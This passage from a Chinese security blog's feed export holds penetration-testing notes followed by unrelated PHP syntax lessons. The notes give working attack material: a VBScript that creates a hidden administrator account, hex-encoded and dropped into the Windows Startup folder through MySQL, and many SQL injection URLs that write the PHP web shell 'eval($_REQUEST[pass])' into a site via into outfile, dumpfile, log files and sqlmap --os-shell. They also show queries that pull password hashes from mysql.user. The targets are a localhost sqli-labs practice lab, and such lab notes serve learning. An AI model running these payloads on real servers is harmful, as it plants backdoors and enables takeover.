class="title">tr</span> <span class="title">class</span>=&quot;<span class="title">mysql</span>&quot;&gt;&lt;<span class="title">td</span>&gt;<span class="title">Username</span>:&lt;/<span class="title">td</span>&gt;&lt;<span class="title">td</span>&gt;&lt;<span class="title">input</span> <span class="title">type</span>=<span class="title">text</span> <span class="title">id</span>=&quot;<span class="title">login</span>&quot; <span class="title">placeholder</span>=&quot;<span class="title">root</span>&quot;&gt;&lt;/<span class="title">td</span>&gt;&lt;/<span class="title">tr</span>&gt;</span></span><br><span class="line"><span class="class">		&lt;<span class="title">tr</span> <span class="title">class</span>=&quot;<span class="title">mysql</span>&quot;&gt;&lt;<span class="title">td</span>&gt;<span class="title">Password</span>:&lt;/<span class="title">td</span>&gt;&lt;<span class="title">td</span>&gt;&lt;<span class="title">input</span> <span class="title">type</span>=<span class="title">password</span> <span class="title">id</span>=&quot;<span class="title">password</span>&quot; <span class="title">placeholder</span>=&quot;&quot;&gt;&lt;/<span class="title">td</span>&gt;&lt;/<span class="title">tr</span>&gt;</span></span><br><span class="line"><span class="class">		&lt;<span class="title">tr</span> <span class="title">class</span>=&quot;<span class="title">sqlite</span>&quot;&gt;&lt;<span class="title">td</span>&gt;<span class="title">Database</span> <span class="title">File</span>:&lt;/<span class="title">td</span>&gt;&lt;<span class="title">td</span>&gt;&lt;<span class="title">input</span> <span class="title">type</span>=<span class="title">text</span> <span class="title">id</span>=&quot;<span class="title">dbfile</span>&quot; <span class="title">placeholder</span>=&quot;<span class="title">sqlite</span>.<span class="title">db</span>&quot;&gt;&lt;/<span class="title">td</span>&gt;&lt;/<span class="title">tr</span>&gt;</span></span><br><span class="line"><span class="class">		&lt;<span class="title">tr</span>&gt;&lt;<span class="title">td</span>&gt;&lt;/<span class="title">td</span>&gt;&lt;<span class="title">td</span>&gt;&lt;<span class="title">br</span>&gt;&lt;<span class="title">input</span> <span class="title">id</span>=&quot;<span class="title">TestButton</span>&quot; <span class="title">type</span>=&quot;<span class="title">submit</span>&quot; <span class="title">value</span>=&quot;<span class="title">Test</span> <span class="title">Connection</span>&quot; <span class="title">onClick</span>=&quot;<span class="title">doServerTest</span>()&quot;&gt;&lt;/<span class="title">td</span>&gt;&lt;/<span class="title">tr</span>&gt;</span></span><br><span class="line"><span class="class">	&lt;/<span class="title">table</span>&gt;</span></span><br><span class="line"><span class="class">	&lt;/<span class="title">form</span>&gt;</span></span><br><span class="line"><span class="class">	&lt;<span class="title">div</span> <span class="title">id</span>=&quot;<span class="title">ServerTest</span>&quot;&gt;&lt;<span class="title">br</span>&gt;&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">fieldset</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">p</span> <span class="title">id</span>=&quot;<span class="title">Copyright</span>&quot;&gt;<span class="title">Copyright</span> &amp;<span class="title">copy</span>; <span class="title">PremiumSoft</span> &amp;<span class="title">trade</span>; <span class="title">CyberTech</span> <span class="title">Ltd</span>. <span class="title">All</span> <span class="title">Rights</span> <span class="title">Reserved</span>.&lt;/<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">body</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>然后连接Navicat，选择HTTP通道，输入带有php脚本的远程链接</p>
<p>然后地址选择本地<code>localhost</code>选择连接，然后就可以执行MySQL命令了</p>
<h2 id="启动项提权"><a href="#启动项提权" class="headerlink" title="启动项提权"></a>启动项提权</h2><p>当 Windows 的启动项可以被 MySQL 写入的时候可以使用 MySQL 将自定义脚本导入到启动项中，这个脚本会在用户登录、开机、关机的时候自动运行。</p>
<p><strong>启动项路径</strong></p>
<p><strong>Windows Server 2003</strong> 的启动项路径</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 中文系统</span></span><br><span class="line">C:\Documents and Settings\Administrator\「开始」菜单\程序\启动</span><br><span class="line">C:\Documents and Settings\All Users\「开始」菜单\程序\启动</span><br><span class="line"></span><br><span class="line"><span class="comment"># 英文系统</span></span><br><span class="line">C:\Documents and Settings\Administrator\Start Menu\Programs\Startup</span><br><span class="line">C:\Documents and Settings\All Users\Start Menu\Programs\Startup</span><br><span class="line"></span><br><span class="line"><span class="comment"># 开关机项 需要自己建立对应文件夹</span></span><br><span class="line">C:\WINDOWS\system32\GroupPolicy\Machine\Scripts\Startup</span><br><span class="line">C:\WINDOWS\system32\GroupPolicy\Machine\Scripts\Shutdown</span><br></pre></td></tr></table></figure>

<p><strong>Windows Server 2008</strong> 的启动项路径</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</span><br><span class="line">C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup</span><br></pre></td></tr></table></figure>

<p>既然知道路径的话就往启动项路径里面写入脚本吧，脚本支持 vbs 和 exe 类型，可以利用 vbs 执行一些 CMD 命令，也可以使用 exe 上线 MSF 或者 CS 这方面还是比较灵活的。下面是一个执行基础命令的 VB 脚本</p>
<figure class="highlight vbscript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Set</span> WshShell=WScript.<span class="built_in">CreateObject</span>(<span class="string">&quot;WScript.Shell&quot;</span>)</span><br><span class="line">WshShell.Run <span class="string">&quot;net user hacker P@ssw0rd /add&quot;</span>, <span class="number">0</span></span><br><span class="line">WshShell.Run <span class="string">&quot;net localgroup administrators hacker /add&quot;</span>, <span class="number">0</span></span><br></pre></td></tr></table></figure>

<p>将上述 vbs 或者 CS 的马转十六进制直接写如到系统启动项中,然后等待系统用户重新登录</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql &gt; select 0x536574205773685368656C6C3D575363726970742E4372656174654F626A6563742822575363726970742E5368656C6C22290A5773685368656C6C2E52756E20226E65742075736572206861636B6572205040737377307264202F616464222C20300A5773685368656C6C2E52756E20226E6574206C6F63616C67726F75702061646D696E6973747261746F7273206861636B6572202F616464222C20300A into dumpfile &quot;C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\test.vbs&quot;;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>漏洞利用</category>
        <category>服务器应用漏洞</category>
        <category>Mysql数据库</category>
        <category>内网渗透</category>
        <category>提权</category>
        <category>数据库提权</category>
      </categories>
      <tags>
        <tag>内网渗透</tag>
        <tag>提权</tag>
      </tags>
  </entry>
  <entry>
    <title>MySql注入Getshell</title>
    <url>//20fec74f57a4.html</url>
    <content><![CDATA[<h2 id="into-outfile"><a href="#into-outfile" class="headerlink" title="into outfile"></a>into outfile</h2><p><strong>利用条件：</strong></p>
<ul>
<li>web目录具有写权限，能够使用单引号</li>
<li>知道网站的路径/绝对路径</li>
<li>secure_file_priv没有具体的值（mysql/my.ini）</li>
</ul>
<p><strong>secure_file_priv</strong> 是用来限制<code>oad dumpfile</code>,<code>into outfile</code>,<code>load_file()</code>函数在哪个目录下拥有上传和读取文件的权限</p>
<ul>
<li>secure_file_priv的值为null ，表示限制mysqld 不允许导入|导出</li>
<li>当secure_file_priv的值为/tmp/ ，表示限制mysqld 的导入|导出只能发生在/tmp/目录下</li>
<li>当secure_file_priv的值没有具体值时，表示不对mysqld 的导入|导出做限制</li>
</ul>
<p>查看secure_file_priv的值</p>
<p>可以在<code>mysql/my.ini</code>文件中修改值</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">show global variables like &#x27;%secure%&#x27;;</span><br></pre></td></tr></table></figure>

<h3 id="利用-into-outfile-通过SQL注入写入文件"><a href="#利用-into-outfile-通过SQL注入写入文件" class="headerlink" title="利用 into outfile 通过SQL注入写入文件"></a>利用 into outfile 通过SQL注入写入文件</h3><p><strong><code>nto outfile</code>会对传入的值进行转义</strong></p>
<p>一句话需要进行16进制编码，以0x为开头</p>
<p>通过工具进行16进制编码之后，需要手动添加0x</p>
<p>以下代码将一句话<code>&lt;?php eval($_REQUEST[pass]);?&gt;</code>写入文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs/Less-1/?id=-1&#x27; union select </span><br><span class="line">1,2,&#x27;&lt;?php eval($_REQUEST[pass]);?&gt;&#x27;</span><br><span class="line">into outfile &#x27;C:/phpStudy/PHPTutorial/WWW/sqli-labs/shell.php&#x27; --+</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs/Less-1/?id=-1&#x27; union select  1,2,0x3c3f706870206576616c28245f524551554553545b706173735d293b3f3e </span><br><span class="line">into outfile &#x27;C:/phpStudy/PHPTutorial/WWW/sqli-labs/shell.php&#x27; --+</span><br></pre></td></tr></table></figure>

<p>通过<code>load_file</code>可以读取文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs/Less-1/?id=-1&#x27; union select  1,2,load_file(&#x27;C:/phpStudy/PHPTutorial/WWW/sqli-labs/shell.php&#x27;) --+</span><br></pre></td></tr></table></figure>



<h2 id="into-dumpfile"><a href="#into-dumpfile" class="headerlink" title="into dumpfile"></a>into dumpfile</h2><p><strong>利用条件：</strong></p>
<ul>
<li>web目录具有写权限，能够使用单引号</li>
<li>知道网站的路径/绝对路径</li>
<li>secure_file_priv没有具体的值（mysql/my.ini）</li>
</ul>
<p><strong>和<code>into outfile</code>不同的是<code>into dumpfile</code>不会对传入的值进行转义</strong></p>
<p>以下代码将一句话<code>&lt;?php eval($_REQUEST[pass]);?&gt;</code>写入文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs/Less-1/?id=-1&#x27; union select </span><br><span class="line">1,2,&#x27;&lt;?php eval($_REQUEST[pass]);?&gt;&#x27;</span><br><span class="line">into dumpfile &#x27;C:/phpStudy/PHPTutorial/WWW/sqli-labs/shell.php&#x27; --+</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs/Less-1/?id=-1&#x27; union select  1,2,0x3c3f706870206576616c28245f524551554553545b706173735d293b3f3e </span><br><span class="line">into dumpfile &#x27;C:/phpStudy/PHPTutorial/WWW/sqli-labs/shell.php&#x27; --+</span><br></pre></td></tr></table></figure>

<p>通过<code>load_file</code>可以读取文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs/Less-1/?id=-1&#x27; union select  1,2,load_file(&#x27;C:/phpStudy/PHPTutorial/WWW/sqli-labs/shell.php&#x27;) --+</span><br></pre></td></tr></table></figure>



<h2 id="union-select-写入"><a href="#union-select-写入" class="headerlink" title="union select 写入"></a>union select 写入</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs/Less-1/?id=-1&#x27; union select </span><br><span class="line">1,2,&#x27;&lt;?php eval($_REQUEST[pass]);?&gt;&#x27;</span><br><span class="line">into outfile &#x27;C:/phpStudy/PHPTutorial/WWW/sqli-labs/shell.php&#x27; --+</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs/Less-1/?id=-1&#x27; union select </span><br><span class="line">1,2,&#x27;&lt;?php eval($_REQUEST[pass]);?&gt;&#x27;</span><br><span class="line">into dumpfile &#x27;C:/phpStudy/PHPTutorial/WWW/sqli-labs/shell.php&#x27; --+</span><br></pre></td></tr></table></figure>



<h2 id="lines-terminated-by-写入"><a href="#lines-terminated-by-写入" class="headerlink" title="lines terminated by 写入"></a>lines terminated by 写入</h2><p><code>lines terminated by</code>意思是以每行终止添加xx内容</p>
<p>这里不能写成<code>id=-1&#39;</code>，会写入空白文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs/Less-1/?id=1&#x27; into outfile &#x27;C:/phpStudy/PHPTutorial/WWW/sqli-labs/shell.php&#x27; lines terminated by </span><br><span class="line">&#x27;&lt;?php eval($_REQUEST[pass]);?&gt;&#x27;; --+</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs/Less-1/?id=1&#x27; into dumpfile &#x27;C:/phpStudy/PHPTutorial/WWW/sqli-labs/shell.php&#x27; lines terminated by </span><br><span class="line">&#x27;&lt;?php eval($_REQUEST[pass]);?&gt;&#x27;; --+</span><br></pre></td></tr></table></figure>



<h2 id="lines-starting-by-写入"><a href="#lines-starting-by-写入" class="headerlink" title="lines starting by 写入"></a>lines starting by 写入</h2><p><code>lines starting by</code>意思是以每行开始添加xx内容</p>
<p>这里不能写成<code>id=-1&#39;</code>，会写入空白文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs/Less-1/?id=1&#x27; into outfile &#x27;C:/phpStudy/PHPTutorial/WWW/sqli-labs/shell.php&#x27; lines starting by </span><br><span class="line">&#x27;&lt;?php eval($_REQUEST[pass]);?&gt;&#x27;; --+</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs/Less-1/?id=1&#x27; into dumpfile &#x27;C:/phpStudy/PHPTutorial/WWW/sqli-labs/shell.php&#x27; lines starting by </span><br><span class="line">&#x27;&lt;?php eval($_REQUEST[pass]);?&gt;&#x27;; --+</span><br></pre></td></tr></table></figure>



<h2 id="fields-terminated-by-写入"><a href="#fields-terminated-by-写入" class="headerlink" title="fields terminated by 写入"></a>fields terminated by 写入</h2><p><code>fields terminated by</code>意思是在每个字段的中间添加内容，可能会添加多次语句</p>
<p>这里不能写成<code>id=-1&#39;</code>，会写入空白文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs/Less-1/?id=1&#x27; into outfile &#x27;C:/phpStudy/PHPTutorial/WWW/sqli-labs/shell.php&#x27; fields terminated by </span><br><span class="line">&#x27;&lt;?php eval($_REQUEST[pass]);?&gt;&#x27;; --+</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs/Less-1/?id=1&#x27; into dumpfile &#x27;C:/phpStudy/PHPTutorial/WWW/sqli-labs/shell.php&#x27; fields terminated by </span><br><span class="line">&#x27;&lt;?php eval($_REQUEST[pass]);?&gt;&#x27;; --+</span><br></pre></td></tr></table></figure>



<h2 id="COLUMNS-terminated-by-写入"><a href="#COLUMNS-terminated-by-写入" class="headerlink" title="COLUMNS terminated by 写入"></a>COLUMNS terminated by 写入</h2><p><code>COLUMNS terminated by</code>和<code>fields terminated by</code>一样</p>
<p>意思是在每个字段的中间添加内容，可能会添加多次语句</p>
<p>这里不能写成<code>id=-1&#39;</code>，会写入空白文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs/Less-1/?id=1&#x27; into outfile &#x27;C:/phpStudy/PHPTutorial/WWW/sqli-labs/shell.php&#x27; COLUMNS terminated by </span><br><span class="line">&#x27;&lt;?php eval($_REQUEST[pass]);?&gt;&#x27;; --+</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs/Less-1/?id=1&#x27; into dumpfile &#x27;C:/phpStudy/PHPTutorial/WWW/sqli-labs/shell.php&#x27; COLUMNS terminated by </span><br><span class="line">&#x27;&lt;?php eval($_REQUEST[pass]);?&gt;&#x27;; --+</span><br></pre></td></tr></table></figure>



<h2 id="MySQL写入一句话"><a href="#MySQL写入一句话" class="headerlink" title="MySQL写入一句话"></a>MySQL写入一句话</h2><p>MySQL写木马，通常可以通过phpmyadmin来实现。</p>
<p>前提条件：有读写的权限，有CREATE、INSERT、SELECT的权限。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 创建一个表</span><br><span class="line">CREATE TABLE shell(cmd text NOT NULL);</span><br><span class="line"># 插入数据</span><br><span class="line">INSERT INTO shell(cmd) VALUES(&#x27;&lt;?php eval($_REQUEST[pass]);?&gt;&#x27;);</span><br><span class="line"># 到出数据到文件</span><br><span class="line">SELECT cmd from shell into outfile </span><br><span class="line">&#x27;C:/phpStudy/PHPTutorial/WWW/sqli-labs/shell.php&#x27;;</span><br><span class="line"># 删除表</span><br><span class="line">Drop TABLE IF EXISTS shell;</span><br></pre></td></tr></table></figure>



<h2 id="日志写入shell"><a href="#日志写入shell" class="headerlink" title="日志写入shell"></a>日志写入shell</h2><p><strong>利用条件：</strong></p>
<ul>
<li>具有写权限</li>
<li>在Windows下</li>
</ul>
<p>MySQL 5.0 版本以上会创建日志文件，可以通过修改日志的全局变量来getshell</p>
<p>查看日志设置</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">show variables like &#x27;general%&#x27;;</span><br></pre></td></tr></table></figure>

<p><code>gengral_log</code>默认关闭，开启可以记录用户输入的每条命令</p>
<p>也可以自定义日志文件</p>
<p>更改日志文件位置</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set global general_log = &quot;ON&quot;;</span><br><span class="line">set global general_log_file = &quot;/var/www/html/shell.php&quot;</span><br></pre></td></tr></table></figure>

<p>写入shell</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select &#x27;&lt;?php phpinfo();?&gt;&#x27;</span><br></pre></td></tr></table></figure>



<h2 id="–os-shell"><a href="#–os-shell" class="headerlink" title="–os-shell"></a>–os-shell</h2><p>–os-shell 这是工具sqlmap的一个命令，使用udf提权获取webshell，也是通过into outfile向服务器写入两个文件，一个可以直接执行系统命令，一个进行文件上传。</p>
<p><strong>利用条件：</strong></p>
<ul>
<li>要求为DBA，–is-dba（phpstudy搭建的一般都是dba）</li>
<li>知道网站的绝对路径</li>
<li>GPC为off，PHP的主动转义功能关闭</li>
</ul>
<p><strong>这里本质也是用<code>into outfile</code>写入文件，所以<code>into outfile</code>的三个条件也需要遵守</strong></p>
<p>通过<code>--sql-shell</code>执行SQL语句</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap.py -u http://127.0.0.1/sqli-labs/Less-1/?id=1 --sql-shell</span><br></pre></td></tr></table></figure>

<p>查询<code>secure_file_priv</code>的值</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select @@secure_file_priv;</span><br></pre></td></tr></table></figure>



<p>通过<code>--os-shell</code>来<code>getshell</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap.py -u http://127.0.0.1/sqli-labs/Less-1/?id=1 --os-shell</span><br></pre></td></tr></table></figure>

<p><img src="http://ww1.sinaimg.cn/large/005XcLBjgy1gud4xw40vlj60mo042taq02.jpg" alt="SQL注入getshell.png"></p>
<p>这里选择4表示网站使用PHP代码，并回复Y</p>
<p><img src="http://ww1.sinaimg.cn/large/005XcLBjgy1gud4z90da7j60ti04caea02.jpg" alt="SQL注入getshell2.png"></p>
<p>然后选择2手动输入网站路径</p>
<p>会生成两个文件，一个用来执行命令，一个用来上传文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs/tmpbtkus.php?cmd=ipconfig</span><br><span class="line">http://127.0.0.1/sqli-labs/tmpuxlmc.php</span><br></pre></td></tr></table></figure>



<h2 id="–file-write"><a href="#–file-write" class="headerlink" title="–file-write"></a>–file-write</h2><p><strong>利用条件：</strong></p>
<ul>
<li>具有写权限</li>
<li>知道网站绝对路径</li>
</ul>
<p>通过<code>--file-write</code>指定本地文件，通过<code>--file-dest</code>指定目标文件地址</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap.py -u http://127.0.0.1/sqli-labs/Less-1/?id=1 --file-write 1.txt --file-dest C:\phpStudy\PHPTutorial\WWW\sqli-labs\shell.php</span><br></pre></td></tr></table></figure>



<h2 id="查询MySQL账号密码"><a href="#查询MySQL账号密码" class="headerlink" title="查询MySQL账号密码"></a>查询MySQL账号密码</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># MySQL &lt;= 5.6 版本</span><br><span class="line">mysql&gt; select host, user, password from mysql.user;</span><br><span class="line"></span><br><span class="line"># MySQL &gt;= 5.7 版本</span><br><span class="line">mysql &gt; select host,user,authentication_string from mysql.user;</span><br><span class="line"># 查询到的值是Hash加密的</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>漏洞利用</category>
        <category>服务器应用漏洞</category>
        <category>Mysql数据库</category>
        <category>渗透测试</category>
        <category>GetShell</category>
      </categories>
      <tags>
        <tag>sql注入</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP-基本语法</title>
    <url>//918598c96c41.html</url>
    <content><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​        PHP（PHP: Hypertext Preprocessor）即“超文本预处理器”，是在服务器端执行的脚本语言，尤其适用于Web开发并可嵌入HTML中。PHP语法学习了C语言，吸纳Java和Perl多个语言的特色发展出自己的特色语法，并根据它们的长项持续改进提升自己，例如java的面向对象编程，该语言当初创建的主要目标是让开发人员快速编写出优质的web网站。 PHP同时支持面向对象和面向过程的开发，使用上非常灵活。</p>
<h2 id="标记"><a href="#标记" class="headerlink" title="标记"></a>标记</h2><p>当解析一个文件时，PHP会寻找起始和结束标记，也就是<code>&lt;?php</code>和<code>?&gt;</code>。这告诉PHP解析两者之间的代码，此种解析方式使得PHP可以被嵌入到各种不同的文档中去，而标签之外的部分会被PHP忽略</p>
<h2 id="指令分隔符"><a href="#指令分隔符" class="headerlink" title="指令分隔符"></a>指令分隔符</h2><p>在PHP中，代码一般以行为单位</p>
<p>如同<code>C</code>或者<code>Perl</code>一样，PHP需要在每个语句后用分号结束指令。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hello&quot;</span>; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<h2 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h2><p>注释可以让PHP解析器忽略我们不需要执行的代码</p>
<p>单行注释<code>//</code></p>
<p>单行注释<code># </code></p>
<p>多行注释<code>/* xxx */</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="comment">// 单行注释</span></span><br><span class="line">    <span class="comment"># 单行注释</span></span><br><span class="line">    <span class="comment">/* 多行注释</span></span><br><span class="line"><span class="comment">    多行 */</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hello&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<h2 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">header(<span class="string">&quot;content-type:text/html;charset=utf-8&quot;</span>);</span><br></pre></td></tr></table></figure>



<h2 id="数据输出"><a href="#数据输出" class="headerlink" title="数据输出"></a>数据输出</h2><p>在PHP中，输出数据一般使用<code>echo</code>或者<code>var_dump()</code></p>
<p><code>echo</code> 输出的是变量和字符串</p>
<p><code>var_dump()</code>输出的是变量类型，变量长度和变量值</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="variable">$a</span> = <span class="string">&#x27;hello&#x27;</span>;</span><br><span class="line">	<span class="keyword">echo</span> is_string(<span class="variable">$a</span>);</span><br><span class="line">	<span class="comment"># 1</span></span><br><span class="line">	<span class="comment"># is_string()函数在PHP中判断数据类型是否为字符串，如果是返回1，如果不是返回0</span></span><br><span class="line">	var_dump(is_string(<span class="variable">$a</span>));</span><br><span class="line">	<span class="comment"># bool(t)</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>编程语言</category>
        <category>PHP</category>
        <category>PHP基础</category>
      </categories>
      <tags>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP-常量与变量</title>
    <url>//df16336bdf60.html</url>
    <content><![CDATA[<h2 id="常量"><a href="#常量" class="headerlink" title="常量"></a>常量</h2><p>常量可以理解为值不变的量。常量值被定义后，在脚本的其他任何地方都不能改变</p>
<p>一个常量由英文字母，下划线，数字组成，但是数字不能作为首字母出现</p>
<p>常量一般以大写字母为主，便于在语言中和变量区分</p>
<p>按照正则表达式，它将被表述为<code>^[a-zA-Z_\x80-\xff][a-zA-Z0-9_\x80-\xff]*$</code></p>
<p>在PHP中使用<code>define()</code>函数来定义全局常量</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">define(<span class="keyword">string</span> constant_name,<span class="keyword">mixed</span> value,case_sensitive=<span class="literal">false</span>)</span><br><span class="line">    constant_name 必选参数，常量名称</span><br><span class="line">    value 必选参数，常量的值</span><br><span class="line">    case_sensitive 可选参数，指定是否大小写敏感，设置<span class="literal">true</span>为大小写不敏感</span><br><span class="line">    </span><br><span class="line">define(<span class="string">&#x27;x&#x27;</span>,<span class="string">&quot;hello&quot;</span>,<span class="literal">False</span>);</span><br><span class="line"><span class="keyword">echo</span> x;</span><br></pre></td></tr></table></figure>

<p>在PHP中使用<code>const</code>来定义类常量</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> x = <span class="string">&quot;hello&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> x;</span><br></pre></td></tr></table></figure>

<p><code>define()</code>的常量不能在类中使用，<code>const</code>可以在类中使用</p>
<p><code>define()</code>可以在条件语句中定义常量，<code>const</code>不可以在条件语句中定义常量</p>
<p><code>const</code>是语言结构，<code>define()</code>是一个方法，<code>const</code>比<code>define()</code>在编译时要快</p>
<p><strong>访问常量</strong></p>
<p>在PHP中，通常使用<code>echo</code>直接输出常量，也可以通过函数<code>constant()</code>来访问常量</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">const</span> X = <span class="string">&quot;hello&quot;</span>;</span><br><span class="line">	<span class="keyword">echo</span> X;</span><br><span class="line">	<span class="keyword">echo</span> constant(<span class="string">&quot;X&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<h2 id="预定义常量"><a href="#预定义常量" class="headerlink" title="预定义常量"></a>预定义常量</h2><p>预定义常量就是 PHP 中预先定义好的常量，使用这些预定义常量可以帮助我们来获取一些 PHP 中的信息</p>
<table>
<thead>
<tr>
<th align="center">序号</th>
<th align="center">内置常量</th>
<th align="center">说明</th>
<th align="center">版本</th>
</tr>
</thead>
<tbody><tr>
<td align="center">1</td>
<td align="center">PHP_VERSION</td>
<td align="center">当前PHP版本号</td>
<td align="center">5.2.7</td>
</tr>
<tr>
<td align="center">2</td>
<td align="center">PHP_MAJOR_VERSION</td>
<td align="center">当前PHP主版本号</td>
<td align="center">5.2.7</td>
</tr>
<tr>
<td align="center">3</td>
<td align="center">PHP_MINOR_VERSION</td>
<td align="center">当前PHP子版本号</td>
<td align="center">5.2.7</td>
</tr>
<tr>
<td align="center">4</td>
<td align="center">PHP_RELEASE_VERSION</td>
<td align="center">当前PHP发布阶段版本号</td>
<td align="center">5.2.7</td>
</tr>
<tr>
<td align="center">5</td>
<td align="center">PHP_VERSION_ID</td>
<td align="center">当前PHP版本的整型数</td>
<td align="center">5.2.7</td>
</tr>
<tr>
<td align="center">6</td>
<td align="center">PHP_EXTRA_VERSION</td>
<td align="center">当前PHP版本的额外版本</td>
<td align="center">5.2.7</td>
</tr>
<tr>
<td align="center">7</td>
<td align="center">PHP_ZTS</td>
<td align="center">当前PHP版本是否是线程安全</td>
<td align="center">5.2.7</td>
</tr>
<tr>
<td align="center">8</td>
<td align="center">PHP_DEBUG</td>
<td align="center">当前PHP版本是否启动debug</td>
<td align="center">5.2.7</td>
</tr>
<tr>
<td align="center">9</td>
<td align="center">PHP_MAXPATHLEN</td>
<td align="center">当前PHP支持最大文件名（路径）的长度</td>
<td align="center">5.3.0</td>
</tr>
<tr>
<td align="center">10</td>
<td align="center">PHP_OS</td>
<td align="center">当前的操作系统名称</td>
<td align="center">5.2.7</td>
</tr>
<tr>
<td align="center">11</td>
<td align="center">PHP_OS_FAMILY</td>
<td align="center">当前的操作系统家族</td>
<td align="center">7.2.0</td>
</tr>
<tr>
<td align="center">12</td>
<td align="center">PHP_SAPI</td>
<td align="center">运行PHP的服务器接口类型</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">13</td>
<td align="center">PHP_EOL</td>
<td align="center">当前系统的行结束符</td>
<td align="center">5.0.2</td>
</tr>
<tr>
<td align="center">14</td>
<td align="center">PHP_INT_MAX</td>
<td align="center">当前PHP支持最大整数</td>
<td align="center">5.0.5</td>
</tr>
<tr>
<td align="center">15</td>
<td align="center">PHP_INT_MIN</td>
<td align="center">当前PHP支持最小整数</td>
<td align="center">7.0.0</td>
</tr>
<tr>
<td align="center">16</td>
<td align="center">PHP_INT_SIZE</td>
<td align="center">当前PHP整型的位数</td>
<td align="center">5.0.5</td>
</tr>
<tr>
<td align="center">17</td>
<td align="center">PHP_FLOAT_DIG</td>
<td align="center">可以返回四舍五入为浮点数后不会造成精度损失的小数位数</td>
<td align="center">7.2.0</td>
</tr>
<tr>
<td align="center">18</td>
